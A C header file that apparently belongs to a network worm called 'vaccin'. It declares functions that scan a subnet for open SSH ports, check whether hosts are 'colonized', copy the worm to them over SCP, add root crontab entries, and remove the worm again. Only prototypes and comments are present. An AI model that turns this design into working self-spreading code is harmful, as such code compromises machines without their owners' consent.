#ifndef VACCIN_H
#define VACCIN_H

 #include "utils.h"
 #include <unistd.h>
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <libgen.h>
 #include <stdbool.h>
 #include <sys/types.h>
 #include <ifaddrs.h>
 #include <arpa/inet.h>

 #define IP_LEN 16

 /*
 * Check if the program is launched by root
 */
 bool isRoot();

 /*
 * Check if a network interface on the system is identical to the administrator ip address
 */
 bool isSourceHost(char *adminIP);

 /*
 * If the given ip address is defined in a network interface, returns the network mask address
 */
 char* getNetworkMask(char *ip);

 /*
 * Scan sub network and check for each address if the given port is opened
 */
 struct in_addr* scanNetwork(char *adminIP, char *broadcastAddr, int portSSH);

 /*
 * Check if the target host is already colonized (check if the worm exists on the target host)
 */
 bool isAlreadyColonized(char *host, char *programName, char *ssh, int portSSH, char *targetPath);

 /*
 * Colinize a target host (copy the worm, the configuration file and update the root crontab)
 */
 bool colonize(char *host, char *programPath, char *ssh, int portSSH, char *scp, char *targetPath, char *crontab);

 /*
 * Check if the worm is allowed to be launched on the system (if the parameter is a file and exists)
 */
 bool isAuthorized(char *control);

 /*
 * Delete the worm, the configuration file and restore the root crontab
 */
 bool wormDelete(char *programName, char *targetPath, char *crontab);

#endif /* VACCCIN_H */
